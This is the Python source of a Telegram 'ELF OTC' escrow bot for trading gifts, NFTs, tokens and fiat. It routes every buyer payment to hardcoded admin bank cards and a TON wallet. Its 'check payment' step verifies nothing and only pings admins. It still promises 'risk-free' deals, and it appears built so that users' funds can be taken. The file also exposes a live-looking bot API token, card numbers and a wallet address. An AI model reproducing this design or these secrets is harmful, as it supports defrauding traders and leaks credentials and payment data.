import asyncio
import uuid
from aiogram import Bot, Dispatcher, Router, types
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.exceptions import TelegramBadRequest
import json
import os
from aiogram import F
from aiogram.types import Message



API_TOKEN = '7390057733:AAHGLDXhlYgJ0wI1LOunrh13Uq7TL_OVPbk'
BOT_USERNAME = 'GarantOtcElfbot' # юзеры без @
ADMIN_USERNAME = 'garantelfots'
ADMINS = [532319147, 7872455559]
bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
# dp.include_router(router)


# Загружаем список пользователей из файла (если он существует)
all_users_file = "all_users.json"
if os.path.exists(all_users_file):
    with open(all_users_file, "r") as f:
        try:
            all_users = set(json.load(f))
        except json.JSONDecodeError:
            all_users = set()
else:
    all_users = set()
    print("set")


DEALS_FILE = "deals.json"

# Загружаем сделки из файла при старте
if os.path.exists(DEALS_FILE):
    with open(DEALS_FILE, "r") as f:
        try:
            deal_storage = json.load(f)
        except json.JSONDecodeError:
            deal_storage = {}
else:
    deal_storage = {}

# Сохраняем сделки в файл
def save_deals():
    with open(DEALS_FILE, "w") as f:
        json.dump(deal_storage, f, indent=2, ensure_ascii=False)


# Память сделок
# deal_storage = {}  # deal_id -> dict


ADMIN_PAYMENT_INFO = {
    "RUB": "Реквизиты РФ карта: 2202208016410459",
    "UAH": "Реквизиты УКР карта: 4441111021471648",
    "TON": "Кошелек TON администратора: UQCeWKoXz1gOgYL_7aZWna70ecSaVdiwl4PatPt7fN505N2L"
}
# Хранилище всех пользователей
# all_users = set()

# Простое хранилище состояний для рассылки
class SimpleStateStorage:
    def __init__(self):
        self.states = {}

    def set_state(self, user_id, state):
        self.states[user_id] = state

    def get_state(self, user_id):
        return self.states.get(user_id)

    def clear_state(self, user_id):
        self.states.pop(user_id, None)

broadcast_state = SimpleStateStorage()

# Добавим методы для хранения в bot['key']
from types import MethodType
Bot.__setitem__ = MethodType(lambda self, key, value: setattr(self, key, value), Bot)
Bot.__getitem__ = MethodType(lambda self, key: getattr(self, key), Bot)

bot['state'] = broadcast_state


# Главная клавиатура
main_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📥 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="🔗 Реферальная ссылка", callback_data="ref_link")],
        # [InlineKeyboardButton(text="🌐 Change language", callback_data="change_lang")],
        [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")]
    ]
)

payment_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="💰 ТОН кошелек", callback_data="pay_ton_wallet")],
        [InlineKeyboardButton(text="💳 На карту", callback_data="pay_card")],
        [InlineKeyboardButton(text="⭐ Звезды", callback_data="pay_stars")]
    ]
)

currency_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Рубли", callback_data="currency_rub")],
        [InlineKeyboardButton(text="🇺🇦 Гривны", callback_data="currency_uah")]
    ]
)

def get_deal_action_keyboard(deal_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data="check_payment")],
            [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data=f"cancel_deal:{deal_id}")]
        ]
    )


# Состояния
class DealStates(StatesGroup):
    waiting_for_ton_wallet = State()
    waiting_for_currency = State()
    waiting_for_card_number = State()
    waiting_for_amount = State()
    waiting_for_product = State()



# Глобальное хранилище рефералов (user_id -> {'count': int, 'invited_users': set()})
referrals = {}

@router.message(Command("start"))
async def start_handler(message: Message):
    parts = message.text.split(maxsplit=1)
    args = parts[1] if len(parts) > 1 else None
    all_users.add(message.from_user.id)
    # Сохраняем all_users в файл
    with open(all_users_file, "w") as f:
        json.dump(list(all_users), f)


    if args:
        # ✅ 1. Проверка на реферальную ссылку
        if args.startswith("ref_"):
            ref_id = int(args.replace("ref_", ""))
            if ref_id != message.from_user.id:
                if ref_id not in referrals:
                    referrals[ref_id] = {'count': 0, 'invited_users': set()}
                if message.from_user.id not in referrals[ref_id]['invited_users']:
                    referrals[ref_id]['invited_users'].add(message.from_user.id)
                    referrals[ref_id]['count'] += 1
                await message.answer(f"👋 Вас пригласил пользователь с ID `{ref_id}`.")

        # ✅ 2. Проверка на ID сделки
        elif args in deal_storage:
            deal = deal_storage[args]
            currency = deal.get("currency", "")
            
            # Определяем валюту для получения нужных реквизитов
            if currency == "₽":
                admin_payment = ADMIN_PAYMENT_INFO.get("RUB")
            elif currency == "₴":
                admin_payment = ADMIN_PAYMENT_INFO.get("UAH")
            elif currency == "TON":
                admin_payment = ADMIN_PAYMENT_INFO.get("TON")
            else:
                admin_payment = "Реквизиты администратора не найдены"

            # Метод без реквизитов (обрезаем из deal['method'])
            method_name = deal.get("method", "").split(" (")[0]

            text = (
                f"🔐 Информация о сделке:\n\n"
                f"💳 Метод оплаты: {method_name} ({admin_payment})\n"
                f"💵 Сумма: {deal['amount']} {currency}\n"
                f"🎁 Товар: {deal['product']}\n\n"
                f"ℹ️ Реквизиты продавца (для информации):\n"
                f"{deal.get('user1_payment_details', 'Реквизиты отсутствуют')}\n\n"
                f"После оплаты нажмите кнопку «Проверить оплату»."
            )

            if message.from_user.id != deal.get("creator_id"):
                # Сохраняем второго участника
                deal["buyer_id"] = message.from_user.id
                deal["buyer_username"] = message.from_user.username

                save_deals()

                # Отправляем сообщение ему
                await message.answer(text, reply_markup=get_deal_action_keyboard(args), parse_mode=ParseMode.HTML)


                # Уведомляем создателя
                creator_id = deal.get("creator_id")
                await bot.send_message(
                    creator_id,
                    f"👤 Пользователь @{message.from_user.username or 'неизвестно'} "
                    f"присоединился к сделке.\n"
                    f"Ожидайте подтверждение оплаты."
                )
            else:
                await message.answer(text)
            return  # Выход, чтобы не показать главное меню

    # Главный экран по умолчанию
    await message.answer(
        "Добро пожаловать в *ELF OTC*! \n"
        "💼 Покупайте и продавайте всё, что угодно – безопасно! "
        "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска. \n\n"
        "Выберите действие:",
        reply_markup=main_keyboard,
        parse_mode="Markdown"
    )

@router.callback_query(lambda c: c.data == "ref_link")
async def referral_link_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or "пользователь"
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    count = referrals.get(user_id, {}).get("count", 0)

    text = (
        f"🔗 <b>Ваша реферальная ссылка:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"👥 <b>Количество приглашённых:</b> {count}\n"
        f"💰 <b>Заработано с рефералов:</b> 0.0 TON"
    )

    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()


@router.callback_query(lambda c: c.data.startswith("cancel_deal:"))
async def cancel_deal_handler(callback: CallbackQuery):
    deal_id = callback.data.split(":")[1]
    deal = deal_storage.get(deal_id)

    if not deal:
        await callback.answer("❌ Сделка не найдена.", show_alert=True)
        return

    if callback.from_user.id != deal.get("buyer_id"):
        await callback.answer("❌ Только покупатель может отменить сделку.", show_alert=True)
        return

    if deal.get("confirmed"):
        await callback.answer("❌ Сделка уже подтверждена. Нельзя отменить.", show_alert=True)
        return

    # Запрос подтверждения выхода — отправляем новое сообщение с кнопками "Да" / "Нет"
    confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Да, выйти из сделки", callback_data=f"confirm_cancel:{deal_id}"),
            InlineKeyboardButton(text="Нет, отменить", callback_data="cancel_cancel")
        ]
    ])

    await callback.message.answer("⚠️ Вы уверены, что хотите выйти из сделки? Оплата ещё не подтверждена.", reply_markup=confirm_kb)
    await callback.answer()


@router.callback_query(lambda c: c.data.startswith("confirm_cancel:"))
async def confirm_cancel_handler(callback: CallbackQuery):
    deal_id = callback.data.split(":")[1]
    deal = deal_storage.get(deal_id)

    if not deal:
        await callback.answer("❌ Сделка не найдена.", show_alert=True)
        return

    if callback.from_user.id != deal.get("buyer_id"):
        await callback.answer("❌ Только покупатель может отменить сделку.", show_alert=True)
        return

    if deal.get("canceled"):
        await callback.answer("❌ Сделка уже отменена.", show_alert=True)
        return

    deal["canceled"] = True

    new_text = (
        f"❌ Вы вышли из сделки `{deal_id}`.\n\n"
        f"💬 Деньги не переводились. Сделка завершена без выполнения."
    )

    try:
        await callback.message.edit_text(
            new_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=None
        )
    except aiogram.exceptions.TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            raise

    # Уведомляем продавца
    creator_id = deal.get("creator_id")
    if creator_id:
        await bot.send_message(
            creator_id,
            f"⚠️ Покупатель @{callback.from_user.username or 'неизвестно'} вышел из сделки `{deal_id}`. Сделка отменена.",
            parse_mode=ParseMode.MARKDOWN
        )

    await callback.answer("Вы вышли из сделки.")



@router.callback_query(lambda c: c.data == "cancel_cancel")
async def cancel_cancel_handler(callback: CallbackQuery):
    await callback.message.delete_reply_markup()
    await callback.answer("Отмена выхода из сделки.")


@router.callback_query(lambda c: c.data.startswith("confirm_payment:"))
async def confirm_payment_callback(callback: CallbackQuery):
    if callback.from_user.id not in ADMINS:
        await callback.answer("❌ Только администратор может подтверждать оплату.", show_alert=True)
        return

    deal_id = callback.data.split(":")[1]
    deal = deal_storage.get(deal_id)

    if not deal:
        await callback.message.answer("❌ Сделка не найдена.")
        return

    # Отмечаем, что оплата подтверждена
    deal["confirmed"] = True
    save_deals()


    buyer_id = deal.get("buyer_id")
    creator_id = deal.get("creator_id")

    # Покупателю
    if buyer_id:
        try:
            await bot.send_message(
                buyer_id,
                "✅ Оплата успешно подтверждена администратором. Ожидайте получение товара."
            )
        except Exception as e:
            print(f"Ошибка отправки покупателю: {e}")

    # Продавцу
    if creator_id:
        try:
            await bot.send_message(
                creator_id,
                "✅ Оплата подтверждена администратором. Передайте, пожалуйста, товар покупателю."
            )
        except Exception as e:
            print(f"Ошибка отправки продавцу: {e}")

    # Ответ админу
    await callback.message.edit_text("✅ Оплата по сделке подтверждена.")
    await callback.answer()



@router.callback_query(lambda c: c.data == "check_payment")
async def check_payment_handler(callback: CallbackQuery):
    # Найдём нужную сделку по buyer_id
    deal_id = None
    for d_id, deal in deal_storage.items():
        if (
            deal.get("buyer_id") == callback.from_user.id and 
            not deal.get("canceled") and 
            not deal.get("confirmed")
        ):
            deal_id = d_id
            break

 

    if not deal_id:
        await callback.message.answer("❌ Сделка не найдена.")
        return

    deal = deal_storage[deal_id]

    # Если сделка отменена — не продолжаем
    if deal.get("canceled"):
        await callback.message.answer("❌ Сделка уже отменена. Проверка оплаты невозможна.")
        return

    creator_id = deal.get("creator_id")
    buyer_username = callback.from_user.username or "неизвестный пользователь"
    product = deal.get("product", "неизвестно")
    amount = deal.get("amount", "не указана")
    currency = deal.get("currency", "")

    # Покупателю
    await callback.message.answer("🔄 Запрос на подтверждение оплаты отправлен администратору. Ожидайте.")

    # Админу — отправим кнопку "✅ Подтвердить оплату"
    confirm_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="✅ Подтвердить оплату",
                callback_data=f"confirm_payment:{deal_id}"
            )]
        ]
    )

    for admin_id in ADMINS:
        await bot.send_message(
            admin_id,
            f"📥 Покупатель @{buyer_username} просит подтвердить оплату по сделке.\n"
            f"🆔 ID сделки: `{deal_id}`\n"
            f"💵 Сумма: {amount} {currency}\n"
            f"🎁 Товар: {product}",
            reply_markup=confirm_keyboard,
            parse_mode=ParseMode.MARKDOWN
        )

    # Продавцу — уведомление
    try:
        await bot.send_message(
            creator_id,
            f"🔔 Покупатель @{buyer_username} запросил подтверждение оплаты по сделке:\n"
            f"<code>{product}</code>",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        print(f"[!] Ошибка при отправке продавцу: {e}")

    await callback.answer("⏳ Запрос отправлен администратору.", show_alert=True)

@router.callback_query(lambda c: c.data == "create_deal")
async def create_deal(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await callback.message.answer("💳 Выберите метод получения оплаты:", reply_markup=payment_keyboard)

@router.callback_query(lambda c: c.data == "pay_ton_wallet")
async def pay_ton_wallet_handler(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer(
        "💰 Введите ваш *TON кошелек* для получения оплаты.\n\nПример:\n`EQC1234567890abcdef...`"
    )
    await state.set_state(DealStates.waiting_for_ton_wallet)

@router.message(DealStates.waiting_for_ton_wallet)
async def ton_wallet_entered(message: Message, state: FSMContext):
    wallet = message.text.strip()
    await state.update_data(method="TON", payment_details=wallet)
    await message.answer("✅ TON кошелек сохранён.\n\nВведите сумму сделки (например: 1500):")
    await state.set_state(DealStates.waiting_for_amount)

@router.callback_query(lambda c: c.data == "pay_card")
async def pay_card_handler(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("💳 Выберите валюту:", reply_markup=currency_keyboard)
    await state.set_state(DealStates.waiting_for_currency)

@router.callback_query(lambda c: c.data in ["currency_rub", "currency_uah"])
async def currency_chosen(callback: CallbackQuery, state: FSMContext):
    currency = "рубли" if callback.data == "currency_rub" else "гривны"
    await state.update_data(method="Карта", currency=currency)
    await callback.message.answer(
        f"💳 Введите номер карты в формате:\n`Банк - 1234567890123456`\n\nПример:\n`ЕвроБанк - 1234567890123456`"
    )
    await state.set_state(DealStates.waiting_for_card_number)

@router.message(DealStates.waiting_for_card_number)
async def card_number_entered(message: Message, state: FSMContext):
    card = message.text.strip()
    await state.update_data(payment_details=card)
    await message.answer("✅ Карта сохранена.\n\nВведите сумму сделки:")
    await state.set_state(DealStates.waiting_for_amount)

@router.callback_query(lambda c: c.data == "pay_stars")
async def pay_stars_handler(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.update_data(method="Звезды", payment_details="оплата звездами")
    await callback.message.answer("Введите сумму сделки:")
    await state.set_state(DealStates.waiting_for_amount)

@router.message(DealStates.waiting_for_amount)
async def amount_entered(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Введите корректную сумму (например: 1500):")
        return
    await state.update_data(amount=amount)
    await message.answer("Введите название товара или ссылку:")
    await state.set_state(DealStates.waiting_for_product)

@router.message(DealStates.waiting_for_product)
async def product_entered(message: Message, state: FSMContext):
    product = message.text.strip()
    data = await state.get_data()

    method = data.get("method")
    details = data.get("payment_details", "")
    amount = data["amount"]
    currency = ""

    if method == "TON":
        currency = "TON"
    elif method == "Карта":
        if data.get("currency") == "рубли":
            currency = "₽"
        elif data.get("currency") == "гривны":
            currency = "₴"
    elif method == "Звезды":
        currency = "⭐"

    deal_id = str(uuid.uuid4())[:8]
    deal_storage[deal_id] = {
    'creator_id': message.from_user.id,
    'creator_username': message.from_user.username or "неизвестно",  # <-- добавлено
    'method': f"{method} ({details})",
    'amount': amount,
    'currency': currency,
    'product': product,
    'user1_payment_details': details
    }

    save_deals()




    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
    await message.answer(
        f"✅ Сделка создана!\n\n"
        f"💳 Метод: {deal_storage[deal_id]['method']}\n"
        f"💵 Сумма: {amount} {currency}\n"
        f"🎁 Товар: {product}\n\n"
        f"🔗 Отправьте эту ссылку второму участнику:\n{link}"
    )
    await state.clear()

@router.message(Command("broadcast"))
async def broadcast_command(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    await message.answer("✉️ Введите сообщение, которое нужно разослать всем пользователям.")
    bot['state'].set_state(message.from_user.id, "waiting_for_broadcast_text")


@router.message(lambda msg: msg.from_user.id in ADMINS)
async def broadcast_text_handler(message: Message):
    if bot['state'].get_state(message.from_user.id) != "waiting_for_broadcast_text":
        return

    bot['state'].clear_state(message.from_user.id)

    sent, failed = 0, 0
    for user_id in all_users:
        try:
            await bot.send_message(user_id, message.text)
            sent += 1
        except Exception:
            failed += 1

    await message.answer(
        f"📬 Рассылка завершена.\n"
        f"✅ Успешно доставлено: {sent}\n"
        f"❌ Ошибок: {failed}"
    )



@dp.message(Command("send"))
async def send_to_user(message: types.Message):
    # print("➡️ Обработчик /send вызван")
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        # Отключаем парсинг, чтобы избежать ошибки
        await message.answer("⚠️ Использование: /send <user_id> <сообщение>", parse_mode=None)
        return

    user_id_str, text = parts[1], parts[2]
    try:
        user_id = int(user_id_str)
        await bot.send_message(user_id, text)
        await message.answer(f"✅ Сообщение отправлено пользователю `{user_id}`.")
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке: {e}")
@dp.message(Command("users"))
async def list_users(message: types.Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    if not all_users:
        await message.answer("ℹ️ Список пользователей пуст.")
        return

    lines = []
    for user_id in all_users:
        try:
            user = await bot.get_chat(user_id)
            full_name = user.full_name or "Не указано"
            username = f"@{user.username}" if user.username else "неизвестно"
            lines.append(f"{full_name} - {username} - `{user_id}`")
        except Exception as e:
            lines.append(f"❌ Ошибка получения info для ID {user_id}: {e}")

    result = "\n".join(lines)
    
    # Если список слишком длинный — разбиваем на части
    if len(result) > 4000:
        chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
        for chunk in chunks:
            await message.answer(chunk, parse_mode="Markdown")
    else:
        await message.answer(result, parse_mode="Markdown")

@dp.message(Command("cancel_deal"))
async def admin_cancel_deal(message: types.Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Использование: /cancel_deal <deal_id>", parse_mode=None)
        return

    deal_id = parts[1].strip()

    deal = deal_storage.get(deal_id)
    if not deal:
        await message.answer(f"❌ Сделка с ID `{deal_id}` не найдена.")
        return

    if deal.get("canceled"):
        await message.answer(f"⚠️ Сделка `{deal_id}` уже была отменена.")
        return

    deal["canceled"] = True
    save_deals()


    creator_id = deal.get("creator_id")
    buyer_id = deal.get("buyer_id")

    if creator_id:
        try:
            await bot.send_message(
                creator_id,
                f"⚠️ Сделка `{deal_id}` была *отменена администратором*.",
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"[!] Ошибка отправки продавцу: {e}")

    if buyer_id:
        try:
            await bot.send_message(
                buyer_id,
                f"⚠️ Сделка `{deal_id}` была *отменена администратором*. Деньги не переводились.",
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"[!] Ошибка отправки покупателю: {e}")

    await message.answer(f"✅ Сделка `{deal_id}` успешно отменена.", parse_mode="Markdown")




# Экранирование MarkdownV2 вручную
def escape_md(text: str) -> str:
    if not isinstance(text, str):
        text = str(text)
    return text.translate(str.maketrans({
        '_': '\\_',
        '*': '\\*',
        '[': '\\[',
        ']': '\\]',
        '(': '\\(',
        ')': '\\)',
        '~': '\\~',
        '`': '\\`',
        '>': '\\>',
        '#': '\\#',
        '+': '\\+',
        '-': '\\-',
        '=': '\\=',
        '|': '\\|',
        '{': '\\{',
        '}': '\\}',
        '.': '\\.',
        '!': '\\!',
    }))

@dp.message(Command("all_deals"))
async def all_deals_handler(message: types.Message):
    try:
        if message.from_user.id not in ADMINS:
            await message.answer("❌ У вас нет прав для этой команды.")
            return

        if not deal_storage:
            await message.answer("📭 Сделок пока нет.")
            return

        response = ""
        count = 0

        for deal_id, deal in deal_storage.items():
            creator_id = deal.get("creator_id", "❓")
            creator_username = escape_md(f"@{deal.get('creator_username', 'неизвестно')}")
            buyer_id = deal.get("buyer_id")
            buyer_username = escape_md(f"@{deal.get('buyer_username', 'неизвестно')}") if buyer_id else "—"

            method = escape_md(deal.get("method", "—"))
            currency = escape_md(deal.get("currency", "—"))
            product = escape_md(deal.get("product", "—"))
            amount = escape_md(str(deal.get("amount", "—")))

            status = (
                "✅ подтверждена" if deal.get("confirmed") else
                "❌ отменена" if deal.get("canceled") else
                "🕐 активна"
            )

            response += (
                f"🆔 ID: `{escape_md(deal_id)}`\n"
                f"👤 Продавец: {creator_username} ({creator_id})\n"
                f"🧑‍💻 Покупатель: {buyer_username} ({buyer_id or '—'})\n"
                f"💳 Метод: {method}\n"
                f"💵 Сумма: {amount} {currency}\n"
                f"🎁 Товар: {product}\n"
                f"📌 Статус: *{status}*\n"
                f"{'-' * 30}\n"
            )

            count += 1

        # Отправка
        if len(response) > 4000:
            await message.answer(f"📦 Всего сделок: {count}", parse_mode="MarkdownV2")
            chunks = [response[i:i + 4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                await message.answer(chunk, parse_mode="MarkdownV2")
        else:
            await message.answer(f"📦 Всего сделок: {count}\n\n{response}", parse_mode="MarkdownV2")

    except Exception as e:
        await message.answer(f"⚠️ Ошибка:\n<code>{escape_md(str(e))}</code>", parse_mode="HTML")
        raise

@dp.message(Command("active_deals"))
async def active_deals_handler(message: types.Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    active = {
        deal_id: deal
        for deal_id, deal in deal_storage.items()
        if not deal.get("canceled") and not deal.get("confirmed")
    }

    if not active:
        await message.answer("📭 Нет активных сделок.")
        return

    response = ""
    count = 0

    for deal_id, deal in active.items():
        creator_id = deal.get("creator_id", "❓")
        creator_username = f"@{deal.get('creator_username', 'неизвестно')}"
        buyer_id = deal.get("buyer_id", None)
        buyer_username = f"@{deal.get('buyer_username', 'неизвестно')}" if buyer_id else "—"

        response += (
            f"🆔 ID: `{deal_id}`\n"
            f"👤 Продавец: {creator_username} ({creator_id})\n"
            f"🧑‍💻 Покупатель: {buyer_username} ({buyer_id or '—'})\n"
            f"💳 Метод: {deal.get('method')}\n"
            f"💵 Сумма: {deal.get('amount')} {deal.get('currency')}\n"
            f"🎁 Товар: {deal.get('product')}\n"
            f"{'-' * 30}\n"
        )
        count += 1

    if len(response) > 4000:
        chunks = [response[i:i + 4000] for i in range(0, len(response), 4000)]
        for chunk in chunks:
            await message.answer(chunk, parse_mode="Markdown")
    else:
        await message.answer(f"📦 Активных сделок: {count}\n\n{response}", parse_mode="Markdown")


@dp.message(Command("confirm"))
async def admin_confirm_deal(message: types.Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Использование: /confirm <deal_id>", parse_mode=None)
        return

    deal_id = parts[1].strip()
    deal = deal_storage.get(deal_id)

    if not deal:
        await message.answer(f"❌ Сделка с ID `{deal_id}` не найдена.")
        return

    if deal.get("confirmed"):
        await message.answer(f"✅ Сделка `{deal_id}` уже была подтверждена ранее.")
        return

    if deal.get("canceled"):
        await message.answer(f"❌ Сделка `{deal_id}` отменена. Подтверждение невозможно.")
        return

    deal["confirmed"] = True
    save_deals()

    buyer_id = deal.get("buyer_id")
    creator_id = deal.get("creator_id")

    # Покупателю
    if buyer_id:
        try:
            await bot.send_message(
                buyer_id,
                "✅ Оплата по сделке подтверждена администратором. Ожидайте получение товара."
            )
        except Exception as e:
            print(f"[!] Ошибка отправки покупателю: {e}")

    # Продавцу
    if creator_id:
        try:
            await bot.send_message(
                creator_id,
                "✅ Администратор подтвердил оплату по вашей сделке. Передайте товар покупателю."
            )
        except Exception as e:
            print(f"[!] Ошибка отправки продавцу: {e}")

    await message.answer(f"✅ Оплата по сделке `{deal_id}` успешно подтверждена.", parse_mode="Markdown")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return

    text = (
        "🛠 <b>Админ-панель</b>\n\n"
        "Доступные команды:\n"
        "/admin — показать это меню\n"
        "/users — список всех пользователей\n"
        "/send &lt;userid&gt; &lt;сообщение&gt; — отправить сообщение пользователю\n"
        "/broadcast — сделать рассылку всем пользователям\n"
        "/cancel_deal &lt;dealid&gt; — отменить сделку вручную\n"
        "/all_deals — список всех сделок\n"
        "/active_deals — список только активных сделок\n"
        "/confirm &lt;deal_id&gt; — подтвердить оплату по ID\n"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

async def main():
    dp.include_router(router)  # 👈 Перенос сюда
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
